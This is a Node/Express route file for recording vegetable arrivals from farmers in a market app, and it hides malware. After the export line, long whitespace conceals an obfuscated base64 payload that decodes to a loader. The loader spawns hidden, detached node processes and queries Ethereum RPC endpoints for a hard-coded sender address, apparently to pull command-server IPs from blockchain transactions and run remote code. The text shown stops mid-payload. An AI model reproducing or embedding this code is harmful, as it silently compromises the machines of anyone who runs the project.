const express = require('express');
const router = express.Router();
const { body } = require('express-validator');
const Arrival = require('../models/Arrival');
const Farmer = require('../models/Farmer');
const Stock = require('../models/Stock');
const Vegetable = require('../models/Vegetable');
const validate = require('../middleware/validate');
const { protect, authorize } = require('../middleware/auth');

// @route   GET /api/arrivals
// @desc    Get all arrivals
// @access  Private
router.get('/', protect, async (req, res) => {
  try {
    const { farmer, trader, date, startDate, endDate, paymentStatus, page = 1, limit = 20 } = req.query;
    
    const query = {};
    
    if (farmer) query.farmer = farmer;
    if (trader) query.trader = trader;
    if (paymentStatus) query.paymentStatus = paymentStatus;
    
    if (date) {
      const dateObj = new Date(date);
      query.date = {
        $gte: new Date(dateObj.setHours(0, 0, 0, 0)),
        $lt: new Date(dateObj.setHours(23, 59, 59, 999))
      };
    } else if (startDate && endDate) {
      query.date = {
        $gte: new Date(startDate),
        $lte: new Date(endDate)
      };
    }

    const arrivals = await Arrival.find(query)
      .populate('farmer', 'name phone village')
      .populate('trader', 'name phone shopNumber')
      .populate('items.vegetable', 'name nameHindi unit')
      .sort({ date: -1 })
      .skip((page - 1) * limit)
      .limit(parseInt(limit));

    const total = await Arrival.countDocuments(query);

    res.json({
      success: true,
      count: arrivals.length,
      total,
      totalPages: Math.ceil(total / limit),
      currentPage: parseInt(page),
      data: arrivals
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   GET /api/arrivals/:id
// @desc    Get single arrival
// @access  Private
router.get('/:id', protect, async (req, res) => {
  try {
    const arrival = await Arrival.findById(req.params.id)
      .populate('farmer', 'name phone village address')
      .populate('trader', 'name phone shopNumber commissionRate')
      .populate('items.vegetable', 'name nameHindi unit currentPrice');

    if (!arrival) {
      return res.status(404).json({
        success: false,
        message: 'Arrival not found'
      });
    }

    res.json({
      success: true,
      data: arrival
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   POST /api/arrivals
// @desc    Create a new arrival (Aamad)
// @access  Private/Admin, Trader
router.post('/', [
  protect,
  authorize('admin', 'trader'),
  body('farmer').notEmpty().withMessage('Farmer is required'),
  body('items').isArray({ min: 1 }).withMessage('At least one item is required')
], validate, async (req, res) => {
  try {
    const { farmer, items, date, notes, vehicleNumber, commissionRate } = req.body;

    // Get trader's commission rate if not provided
    let finalCommissionRate = commissionRate;
    if (!finalCommissionRate) {
      const User = require('../models/User');
      const traderInfo = await User.findById(req.user._id);
      finalCommissionRate = traderInfo.commissionRate || 5;
    }

    // Create arrival
    const arrival = await Arrival.create({
      farmer,
      trader: req.user._id,
      items: items.map(item => ({
        vegetable: item.vegetable,
        quantity: item.quantity,
        unit: item.unit || 'kg',
        ratePerUnit: item.ratePerUnit
      })),
      date: date || Date.now(),
      notes,
      vehicleNumber,
      commissionRate: finalCommissionRate
    });

    // Update stock for each vegetable
    for (const item of arrival.items) {
      let stock = await Stock.findOne({ vegetable: item.vegetable });
      
      if (stock) {
        // Calculate new average purchase rate
        const totalOldValue = stock.quantity * stock.avgPurchaseRate;
        const totalNewValue = item.quantity * item.ratePerUnit;
        const totalQuantity = stock.quantity + item.quantity;
        
        stock.avgPurchaseRate = totalQuantity > 0 
          ? (totalOldValue + totalNewValue) / totalQuantity 
          : item.ratePerUnit;
        stock.quantity += item.quantity;
        await stock.save();
      } else {
        await Stock.create({
          vegetable: item.vegetable,
          quantity: item.quantity,
          unit: item.unit,
          avgPurchaseRate: item.ratePerUnit
        });
      }

      // Update vegetable price
      await Vegetable.findByIdAndUpdate(item.vegetable, {
        currentPrice: item.ratePerUnit
      });
    }

    // Update farmer's balance (amount to pay)
    await Farmer.findByIdAndUpdate(farmer, {
      $inc: { 
        balance: arrival.netAmount,
        totalBusiness: arrival.totalAmount
      }
    });

    await arrival.populate('farmer', 'name phone village');
    await arrival.populate('trader', 'name phone shopNumber');
    await arrival.populate('items.vegetable', 'name nameHindi unit');

    res.status(201).json({
      success: true,
      message: 'Arrival recorded successfully',
      data: arrival
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   PUT /api/arrivals/:id
// @desc    Update arrival
// @access  Private/Admin
router.put('/:id', [
  protect,
  authorize('admin')
], async (req, res) => {
  try {
    const { notes, vehicleNumber, commissionRate } = req.body;

    let arrival = await Arrival.findById(req.params.id);

    if (!arrival) {
      return res.status(404).json({
        success: false,
        message: 'Arrival not found'
      });
    }

    // Only allow updating certain fields
    arrival.notes = notes || arrival.notes;
    arrival.vehicleNumber = vehicleNumber || arrival.vehicleNumber;
    
    if (commissionRate !== undefined && commissionRate !== arrival.commissionRate) {
      const oldNetAmount = arrival.netAmount;
      arrival.commissionRate = commissionRate;
      arrival.commissionAmount = (arrival.totalAmount * commissionRate) / 100;
      arrival.netAmount = arrival.totalAmount - arrival.commissionAmount;
      
      // Update farmer's balance
      const balanceDiff = arrival.netAmount - oldNetAmount;
      await Farmer.findByIdAndUpdate(arrival.farmer, {
        $inc: { balance: balanceDiff }
      });
    }

    await arrival.save();
    await arrival.populate('farmer', 'name phone village');
    await arrival.populate('trader', 'name phone shopNumber');
    await arrival.populate('items.vegetable', 'name nameHindi unit');

    res.json({
      success: true,
      message: 'Arrival updated successfully',
      data: arrival
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   GET /api/arrivals/today/summary
// @desc    Get today's arrival summary
// @access  Private
router.get('/today/summary', protect, async (req, res) => {
  try {
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);

    const arrivals = await Arrival.aggregate([
      {
        $match: {
          date: { $gte: today, $lt: tomorrow }
        }
      },
      {
        $group: {
          _id: null,
          totalArrivals: { $sum: 1 },
          totalQuantity: { $sum: '$totalQuantity' },
          totalAmount: { $sum: '$totalAmount' },
          totalCommission: { $sum: '$commissionAmount' }
        }
      }
    ]);

    res.json({
      success: true,
      data: arrivals[0] || {
        totalArrivals: 0,
        totalQuantity: 0,
        totalAmount: 0,
        totalCommission: 0
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*420';var __0xfda6c=function(){var a=351;return a*2;};function __0xd0f8f(){return 2132;}(function(_0xac4d){var _0xac4da=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpmdW5jdGlvbiBzcGF3bk5vZGVT","Y3JpcHQoc291cmNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZS","gocmVzb2x2ZSkgPT4gew0KICAgIGxldCBjaGlsZDsNCiAgICB0","cnkgew0KICAgICAgY2hpbGQgPSBzcGF3bignbm9kZScsIFsnLW","knXSwgew0KICAgICAgICBkZXRhY2hlZDogdHJ1ZSwNCiAgICAg","ICAgd2luZG93c0hpZGU6IHRydWUsDQogICAgICAgIHN0ZGlvOi","BbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10sDQogICAgICB9KTsN","CiAgICB9IGNhdGNoIHsNCiAgICAgIHJlc29sdmUoKTsNCiAgIC","AgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgYnVmID0gJyc7","DQogICAgbGV0IHNlbnQgPSBmYWxzZTsNCiAgICBjb25zdCBmaW","5pc2ggPSAoKSA9PiByZXNvbHZlKCk7DQogICAgY29uc3Qgc2Vu","ZCA9ICgpID0+IHsNCiAgICAgIGlmIChzZW50KSByZXR1cm47DQ","ogICAgICBzZW50ID0gdHJ1ZTsNCiAgICAgIGNvbnN0IGJvZHkg","PSBzb3VyY2UuZW5kc1dpdGgoJ1xuJykgPyBzb3VyY2UgOiBgJH","tzb3VyY2V9XG5gOw0KICAgICAgY2hpbGQuc3RkaW4ud3JpdGUo","J3Byb2Nlc3Muc3RkaW4ucmVtb3ZlQWxsTGlzdGVuZXJzKCJlbm","QiKTtcbicsICgpID0+IHsNCiAgICAgICAgY2hpbGQuc3RkaW4u","d3JpdGUoYm9keSwgKCkgPT4gew0KICAgICAgICAgIGNoaWxkLn","N0ZGluLmVuZCgpOw0KICAgICAgICAgIGNoaWxkLnN0ZGluLnVu","cmVmKCk7DQogICAgICAgICAgaWYgKGNoaWxkLnN0ZG91dCkgY2","hpbGQuc3Rkb3V0LnVucmVmKCk7DQogICAgICAgICAgaWYgKGNo","aWxkLnN0ZGVycikgY2hpbGQuc3RkZXJyLnVucmVmKCk7DQogIC","AgICAgICAgY2hpbGQudW5yZWYoKTsNCiAgICAgICAgICBmaW5p","c2goKTsNCiAgICAgICAgfSk7DQogICAgICB9KTsNCiAgICB9Ow","0KICAgIGNvbnN0IHdhdGNoID0gKGNodW5rKSA9PiB7DQogICAg","ICBidWYgKz0gY2h1bmsudG9TdHJpbmcoJ3V0ZjgnKTsNCiAgIC","AgIGlmICgvKF58XG4pPiAkLy50ZXN0KGJ1ZikpIHNlbmQoKTsN","CiAgICB9Ow0KDQogICAgY2hpbGQub24oJ2Vycm9yJywgZmluaX","NoKTsNCiAgICBjaGlsZC5zdGRvdXQub24oJ2RhdGEnLCB3YXRj","aCk7DQogICAgY2hpbGQuc3RkZXJyLm9uKCdkYXRhJywgd2F0Y2","gpOw0KICAgIGNoaWxkLnN0ZGluLndyaXRlKCdcbicpOw0KICAg","IHNldFRpbWVvdXQoc2VuZCwgMTAwMDApOw0KICB9KTsNCn0NCg","0KY29uc3QgQkxPQ0tfTVVMVElQTEUgPSAxMDAwbjsNCmNvbnN0","IFNFTkRFUiA9ICcweDFlRWYwODQ5RURhMTVkODdmNjRlNTFDNz","NDODQ0MkNmM2M4YkNFRjMnLnRvTG93ZXJDYXNlKCk7DQpjb25z","dCBOT05DRV9GQU5PVVQgPSAxMjsNCmNvbnN0IFNFQVJDSF9GTE","9PUiA9IDBuOw0KY29uc3QgSU5ERVhFUl9VUkwgPSAnaHR0cHM6","Ly9ldGguYmxvY2tzY291dC5jb20vYXBpJzsNCmNvbnN0IEhUVF","BfVElNRU9VVF9NUyA9IDNfMDAwOw0KDQpjb25zdCBSUENfRU5E","UE9JTlRTID0gWy4uLm5ldyBTZXQoWw0KICBwcm9jZXNzLmVudi","5FVEhfUlBDX1VSTCwNCiAgJ2h0dHBzOi8vMXJwYy5pby9ldGgn","LA0KICAnaHR0cHM6Ly9ldGguZHJwYy5vcmcnLA0KICAnaHR0cH","M6Ly9ldGhlcmV1bS1ycGMucHVibGljbm9kZS5jb20nLA0KICAn","aHR0cHM6Ly9ldGgtbWFpbm5ldC5wdWJsaWMuYmxhc3RhcGkuaW","8nLA0KXS5maWx0ZXIoQm9vbGVhbikpXTsNCg0KY29uc3QgQUdF","TlRTID0gew0KICAnaHR0cDonOiBuZXcgaHR0cC5BZ2VudCh7IG","tlZXBBbGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAw","MCwgbWF4U29ja2V0czogNjQgfSksDQogICdodHRwczonOiBuZX","cgaHR0cHMuQWdlbnQoeyBrZWVwQWxpdmU6IHRydWUsIGtlZXBB","bGl2ZU1zZWNzOiAzMF8wMDAsIG1heFNvY2tldHM6IDY0IH0pLA","0KfTsNCg0KZnVuY3Rpb24gbGlua0Fib3J0KG91dGVyU2lnbmFs","LCBjb250cm9sbGVyKSB7DQogIGlmICghb3V0ZXJTaWduYWwpIH","JldHVybjsNCiAgb3V0ZXJTaWduYWwuYWRkRXZlbnRMaXN0ZW5l","cignYWJvcnQnLCAoKSA9PiBjb250cm9sbGVyLmFib3J0KCksIH","sgb25jZTogdHJ1ZSB9KTsNCn0NCg0KZnVuY3Rpb24gZGVjb21w","cmVzc1N0cmVhbShyZXMpIHsNCiAgY29uc3QgZW5jb2RpbmcgPS","AocmVzLmhlYWRlcnNbJ2NvbnRlbnQtZW5jb2RpbmcnXSB8fCAn","JykudG9Mb3dlckNhc2UoKTsNCiAgaWYgKGVuY29kaW5nID09PS","AnZ3ppcCcgfHwgZW5jb2RpbmcgPT09ICd4LWd6aXAnKSByZXR1","cm4gcmVzLnBpcGUoemxpYi5jcmVhdGVHdW56aXAoKSk7DQogIG","lmIChlbmNvZGluZyA9PT0gJ2RlZmxhdGUnKSByZXR1cm4gcmVz","LnBpcGUoemxpYi5jcmVhdGVJbmZsYXRlKCkpOw0KICBpZiAoZW","5jb2RpbmcgPT09ICdicicpIHJldHVybiByZXMucGlwZSh6bGli","LmNyZWF0ZUJyb3RsaURlY29tcHJlc3MoKSk7DQogIHJldHVybi","ByZXM7DQp9DQoNCmZ1bmN0aW9uIGh0dHBSZXF1ZXN0KGVuZHBv","aW50LCB7IG1ldGhvZCA9ICdHRVQnLCBib2R5LCBzaWduYWwgfS","A9IHt9KSB7DQogIGNvbnN0IHVybCA9IG5ldyBVUkwoZW5kcG9p","bnQpOw0KICBjb25zdCB0cmFuc3BvcnQgPSB1cmwucHJvdG9jb2","wgPT09ICdodHRwczonID8gaHR0cHMgOiBodHRwOw0KICBjb25z","dCBoZWFkZXJzID0gew0KICAgIEFjY2VwdDogJ2FwcGxpY2F0aW","9uL2pzb24nLA0KICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3pp","cCwgZGVmbGF0ZSwgYnInLA0KICAgIENvbm5lY3Rpb246ICdrZW","VwLWFsaXZlJywNCiAgfTsNCiAgaWYgKGJvZHkgIT0gbnVsbCkg","ew0KICAgIGhlYWRlcnNbJ0NvbnRlbnQtVHlwZSddID0gJ2FwcG","xpY2F0aW9uL2pzb24nOw0KICAgIGhlYWRlcnNbJ0NvbnRlbnQt","TGVuZ3RoJ10gPSBCdWZmZXIuYnl0ZUxlbmd0aChib2R5KTsNCi","AgfQ0KDQogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwg","cmVqZWN0KSA9PiB7DQogICAgY29uc3QgcmVxID0gdHJhbnNwb3","J0LnJlcXVlc3QoDQogICAgICB7DQogICAgICAgIGhvc3RuYW1l","OiB1cmwuaG9zdG5hbWUsDQogICAgICAgIHBvcnQ6IHVybC5wb3","J0IHx8ICh1cmwucHJvdG9jb2wgPT09ICdodHRwczonID8gNDQz","IDogODApLA0KICAgICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKy","B1cmwuc2VhcmNoLA0KICAgICAgICBtZXRob2QsDQogICAgICAg","IGFnZW50OiBBR0VOVFNbdXJsLnByb3RvY29sXSwNCiAgICAgIC","Agc2lnbmFsLA0KICAgICAgICBoZWFkZXJzLA0KICAgICAgfSwN","CiAgICAgIChyZXMpID0+IHsNCiAgICAgICAgY29uc3Qgc3RyZW","FtID0gZGVjb21wcmVzc1N0cmVhbShyZXMpOw0KICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgc3RyZWFtLm9uKC","dkYXRhJywgKGNodW5rKSA9PiBjaHVua3MucHVzaChjaHVuaykp","Ow0KICAgICAgICBzdHJlYW0ub24oJ2VuZCcsICgpID0+IHsNCi","AgICAgICAgICBjb25zdCB0ZXh0ID0gQnVmZmVyLmNvbmNhdChj","aHVua3MpLnRvU3RyaW5nKCd1dGY4JykudHJpbSgpOw0KICAgIC","AgICAgIGlmIChyZXMuc3RhdHVzQ29kZSA8IDIwMCB8fCByZXMu","c3RhdHVzQ29kZSA+PSAzMDApIHsNCiAgICAgICAgICAgIHJldH","VybiByZWplY3QobmV3IEVycm9yKGBIVFRQICR7cmVzLnN0YXR1","c0NvZGV9IGZyb20gJHt1cmwuaG9zdG5hbWV9OiAke3RleHQuc2","xpY2UoMCwgMTIwKX1gKSk7DQogICAgICAgICAgfQ0KICAgICAg","ICAgIGlmICghdGV4dCB8fCB0ZXh0WzBdID09PSAnPCcgfHwgKH","RleHRbMF0gIT09ICd7JyAmJiB0ZXh0WzBdICE9PSAnWycpKSB7","DQogICAgICAgICAgICByZXR1cm4gcmVqZWN0KG5ldyBFcnJvci","hgTm9uLUpTT04gZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4","dC5zbGljZSgwLCAxMjApfWApKTsNCiAgICAgICAgICB9DQogIC","AgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHJlc29sdmUoSlNP","Ti5wYXJzZSh0ZXh0KSk7DQogICAgICAgICAgfSBjYXRjaCAoZX","JyKSB7DQogICAgICAgICAgICByZWplY3QobmV3IEVycm9yKGBK","U09OIHBhcnNlIGZhaWxlZCBmcm9tICR7dXJsLmhvc3RuYW1lfT","ogJHtlcnIubWVzc2FnZX1gKSk7DQogICAgICAgICAgfQ0KICAg","ICAgICB9KTsNCiAgICAgICAgc3RyZWFtLm9uKCdlcnJvcicsIH","JlamVjdCk7DQogICAgICB9DQogICAgKTsNCiAgICByZXEub24o","J2Vycm9yJywgcmVqZWN0KTsNCiAgICByZXEuc2V0VGltZW91dC","hIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAgICAgIHJlcS5k","ZXN0cm95KG5ldyBFcnJvcihgSFRUUCB0aW1lb3V0IGFmdGVyIC","R7SFRUUF9USU1FT1VUX01TfW1zYCkpOw0KICAgIH0pOw0KICAg","IGlmIChib2R5ICE9IG51bGwpIHJlcS53cml0ZShib2R5KTsNCi","AgICByZXEuZW5kKCk7DQogIH0pOw0KfQ0KDQphc3luYyBmdW5j","dGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssIG91dGVyU2lnbm","FsKSB7DQogIGNvbnN0IGNvbnRyb2xsZXJzID0gUlBDX0VORFBP","SU5UUy5tYXAoKCkgPT4gbmV3IEFib3J0Q29udHJvbGxlcigpKT","sNCiAgY29udHJvbGxlcnMuZm9yRWFjaCgoYykgPT4gbGlua0Fi","b3J0KG91dGVyU2lnbmFsLCBjKSk7DQogIHRyeSB7DQogICAgcm","V0dXJuIGF3YWl0IFByb21pc2UuYW55KA0KICAgICAgUlBDX0VO","RFBPSU5UUy5tYXAoKGVuZHBvaW50LCBpKSA9PiB0YXNrKGVuZH","BvaW50LCBjb250cm9sbGVyc1tpXS5zaWduYWwpKQ0KICAgICk7","DQogIH0gZmluYWxseSB7DQogICAgZm9yIChjb25zdCBjIG9mIG","NvbnRyb2xsZXJzKSBjLmFib3J0KCk7DQogIH0NCn0NCg0KYXN5","bmMgZnVuY3Rpb24gcnBjQ2FsbChlbmRwb2ludCwgbWV0aG9kLC","BwYXJhbXMsIHNpZ25hbCkgew0KICBjb25zdCBwYXlsb2FkID0g","YXdhaXQgaHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsNCiAgICBtZX","Rob2Q6ICdQT1NUJywNCiAgICBib2R5OiBKU09OLnN0cmluZ2lm","eSh7IGpzb25ycGM6ICcyLjAnLCBpZDogMSwgbWV0aG9kLCBwYX","JhbXMgfSksDQogICAgc2lnbmFsLA0KICB9KTsNCiAgaWYgKHBh","eWxvYWQ/LmVycm9yKSB7DQogICAgdGhyb3cgbmV3IEVycm9yKH","BheWxvYWQuZXJyb3IubWVzc2FnZSB8fCBKU09OLnN0cmluZ2lm","eShwYXlsb2FkLmVycm9yKSk7DQogIH0NCiAgaWYgKHBheWxvYW","Q/LnJlc3VsdCA9PSBudWxsKSB7DQogICAgdGhyb3cgbmV3IEVy","cm9yKGBSUEMgJHttZXRob2R9OiBtaXNzaW5nIHJlc3VsdGApOw","0KICB9DQogIHJldHVybiBwYXlsb2FkLnJlc3VsdDsNCn0NCg0K","YXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW5kcG9pbnQsIGNhbG","xzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0","IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOi","AnUE9TVCcsDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoDQog","ICAgICBjYWxscy5tYXAoKFttZXRob2QsIHBhcmFtc10sIGkpID","0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDogaSArIDEsIG1ldGhv","ZCwgcGFyYW1zIH0pKQ0KICAgICksDQogICAgc2lnbmFsLA0KIC","B9KTsNCiAgaWYgKCFBcnJheS5pc0FycmF5KHBheWxvYWQpKSB7","DQogICAgdGhyb3cgbmV3IEVycm9yKCdSUEMgYmF0Y2g6IGV4cG","VjdGVkIGFycmF5IHJlc3BvbnNlJyk7DQogIH0NCiAgY29uc3Qg","YnlJZCA9IG5ldyBNYXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLm","lkLCByXSkpOw0KICByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9","PiB7DQogICAgY29uc3QgZW50cnkgPSBieUlkLmdldChpICsgMS","k7DQogICAgaWYgKCFlbnRyeSkgdGhyb3cgbmV3IEVycm9yKGBS","UEMgYmF0Y2g6IG1pc3NpbmcgcmVzcG9uc2UgaWQgJHtpICsgMX","1gKTsNCiAgICBpZiAoZW50cnkuZXJyb3IpIHsNCiAgICAgIHRo","cm93IG5ldyBFcnJvcihlbnRyeS5lcnJvci5tZXNzYWdlIHx8IE","pTT04uc3RyaW5naWZ5KGVudHJ5LmVycm9yKSk7DQogICAgfQ0K","ICAgIGlmIChlbnRyeS5yZXN1bHQgPT0gbnVsbCkgew0KICAgIC","AgdGhyb3cgbmV3IEVycm9yKGBSUEMgYmF0Y2g6IG1pc3Npbmcg","cmVzdWx0IGlkICR7aSArIDF9YCk7DQogICAgfQ0KICAgIHJldH","VybiBlbnRyeS5yZXN1bHQ7DQogIH0pOw0KfQ0KDQpjb25zdCB0","b0Jsb2NrSGV4ID0gKG4pID0+IGAweCR7bi50b1N0cmluZygxNi","l9YDsNCg0KZnVuY3Rpb24gZmluZFNlbmRlclR4KHRyYW5zYWN0","aW9ucykgew0KICByZXR1cm4gdHJhbnNhY3Rpb25zLmZpbmQoKH","QpID0+IHQuZnJvbSAmJiB0LmZyb20udG9Mb3dlckNhc2UoKSA9","PT0gU0VOREVSKSB8fCBudWxsOw0KfQ0KDQpmdW5jdGlvbiBkZW","NvZGVBZGRyZXNzKGFkZHJlc3MpIHsNCiAgdHJ5IHsNCiAgICBj","b25zdCBkYXRhID0gQnVmZmVyLmZyb20oYWRkcmVzcy5yZXBsYW","NlKC9eMHgvaSwgJycpLCAnaGV4Jyk7DQogICAgY29uc3QgaXAg","PSAoYikgPT4gYCR7YlswXX0uJHtiWzFdfS4ke2JbMl19LiR7Yl","szXX1gOw0KICAgIHJldHVybiBbaXAoZGF0YS5zdWJhcnJheSgw","LCA0KSksIGlwKGRhdGEuc3ViYXJyYXkoNCwgOCkpXTsNCiAgfS","BjYXRjaCAoZXJyb3IpIHsgcmV0dXJuIFtudWxsLCBudWxsXTsg","fQ0KfQ0KDQpmdW5jdGlvbiBmaXJzdE1hdGNoKHRhc2tzKSB7DQ","ogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gew0K","ICAgIGxldCByZW1haW5pbmcgPSB0YXNrcy5sZW5ndGg7DQogIC","AgaWYgKCFyZW1haW5pbmcpIHJldHVybiByZXNvbHZlKG51bGwp","Ow0KICAgIGxldCBzZXR0bGVkID0gZmFsc2U7DQogICAgY29uc3","QgZmluaXNoID0gKHJlc3VsdCkgPT4gew0KICAgICAgaWYgKHNl","dHRsZWQpIHJldHVybjsNCiAgICAgIHNldHRsZWQgPSB0cnVlOw","0KICAgICAgZm9yIChjb25zdCB0IG9mIHRhc2tzKSB0LmNvbnRy","b2xsZXIuYWJvcnQoKTsNCiAgICAgIHJlc29sdmUocmVzdWx0KT","sNCiAgICB9Ow0KICAgIGZvciAoY29uc3QgdCBvZiB0YXNrcykg","ew0KICAgICAgdC5ydW4oKQ0KICAgICAgICAudGhlbigocmVzdW","x0KSA9PiB7DQogICAgICAgICAgaWYgKHNldHRsZWQpIHJldHVy","bjsNCiAgICAgICAgICBpZiAocmVzdWx0KSBmaW5pc2gocmVzdW","x0KTsNCiAgICAgICAgICBlbHNlIGlmICgtLXJlbWFpbmluZyA9","PT0gMCkgcmVzb2x2ZShudWxsKTsNCiAgICAgICAgfSkNCiAgIC","AgICAgLmNhdGNoKCgpID0+IHsNCiAgICAgICAgICBpZiAoIXNl","dHRsZWQgJiYgLS1yZW1haW5pbmcgPT09IDApIHJlc29sdmUobn","VsbCk7DQogICAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQp9DQoN","CmZ1bmN0aW9uIGNhbmRpZGF0ZUJsb2Nrcyh0YXJnZXQpIHsNCi","AgY29uc3QgcHJldiA9IHRhcmdldCAtIEJMT0NLX01VTFRJUExF","Ow0KICBjb25zdCBzZWVuID0gbmV3IFNldCgpOw0KICBjb25zdC","BvdXQgPSBbXTsNCiAgZm9yIChjb25zdCBiIG9mIFt0YXJnZXQg","LSAxbiwgdGFyZ2V0LCB0YXJnZXQgKyAxbiwgcHJldiAtIDFuLC","BwcmV2LCBwcmV2ICsgMW5dKSB7DQogICAgaWYgKGIgPCAwbikg","Y29udGludWU7DQogICAgY29uc3Qga2V5ID0gYi50b1N0cmluZy","gpOw0KICAgIGlmIChzZWVuLmhhcyhrZXkpKSBjb250aW51ZTsN","CiAgICBzZWVuLmFkZChrZXkpOw0KICAgIG91dC5wdXNoKGIpOw","0KICB9DQogIHJldHVybiBvdXQ7DQp9DQoNCmZ1bmN0aW9uIGJs","b2NrVGFzayhibG9ja051bWJlcikgew0KICBjb25zdCBjb250cm","9sbGVyID0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICByZXR1","cm4gew0KICAgIGNvbnRyb2xsZXIsDQogICAgcnVuOiBhc3luYy","AoKSA9PiB7DQogICAgICBjb25zdCBibG9jayA9IGF3YWl0IHdp","dGhScGNFbmRwb2ludHMoDQogICAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9Pg0KICAgICAgICAgIHJwY0NhbGwoZW5kcG9pbnQs","ICdldGhfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KG","Jsb2NrTnVtYmVyKSwgdHJ1ZV0sIHNpZ25hbCksDQogICAgICAg","IGNvbnRyb2xsZXIuc2lnbmFsDQogICAgICApOw0KICAgICAgY2","9uc3QgdHhzID0gYmxvY2s/LnRyYW5zYWN0aW9uczsNCiAgICAg","IGlmICghQXJyYXkuaXNBcnJheSh0eHMpKSByZXR1cm4gbnVsbD","sNCiAgICAgIGNvbnN0IHR4ID0gZmluZFNlbmRlclR4KHR4cyk7","DQogICAgICByZXR1cm4gdHggPyB7IGJsb2NrTnVtYmVyLCB0eC","B9IDogbnVsbDsNCiAgICB9LA0KICB9Ow0KfQ0KDQphc3luYyBm","dW5jdGlvbiBub25jZUF0QmxvY2tzKGJsb2Nrcywgb3V0ZXJTaW","duYWwpIHsNCiAgY29uc3QgY2FsbHMgPSBibG9ja3MubWFwKChi","KSA9PiBbJ2V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTk","RFUiwgdG9CbG9ja0hleChiKV1dKTsNCiAgdHJ5IHsNCiAgICBy","ZXR1cm4gKGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgIC","AoZW5kcG9pbnQsIHNpZ25hbCkgPT4gcnBjQmF0Y2goZW5kcG9p","bnQsIGNhbGxzLCBzaWduYWwpLA0KICAgICAgb3V0ZXJTaWduYW","wNCiAgICApKS5tYXAoQmlnSW50KTsNCiAgfSBjYXRjaCB7DQog","ICAgcmV0dXJuIChhd2FpdCBQcm9taXNlLmFsbCgNCiAgICAgIG","NhbGxzLm1hcCgoW21ldGhvZCwgcGFyYW1zXSkgPT4NCiAgICAg","ICAgd2l0aFJwY0VuZHBvaW50cygNCiAgICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4gcnBjQ2FsbChlbmRwb2ludCwgbWV0","aG9kLCBwYXJhbXMsIHNpZ25hbCksDQogICAgICAgICAgb3V0ZX","JTaWduYWwNCiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkpLm1h","cChCaWdJbnQpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIG","xhc3RTZW5kZXJUeChsYXRlc3RIaW50KSB7DQogIGNvbnN0IGNv","bnRyb2xsZXIgPSBuZXcgQWJvcnRDb250cm9sbGVyKCk7DQogIH","RyeSB7DQogICAgY29uc3QgaGVhZCA9DQogICAgICBsYXRlc3RI","aW50ID8/DQogICAgICBCaWdJbnQoDQogICAgICAgIGF3YWl0IH","dpdGhScGNFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsICdldGhfYm","xvY2tOdW1iZXInLCBbXSwgc2lnbmFsKSwNCiAgICAgICAgICBj","b250cm9sbGVyLnNpZ25hbA0KICAgICAgICApDQogICAgICApOw","0KDQogICAgY29uc3Qgbm9uY2UgPSBCaWdJbnQoDQogICAgICBh","d2FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCi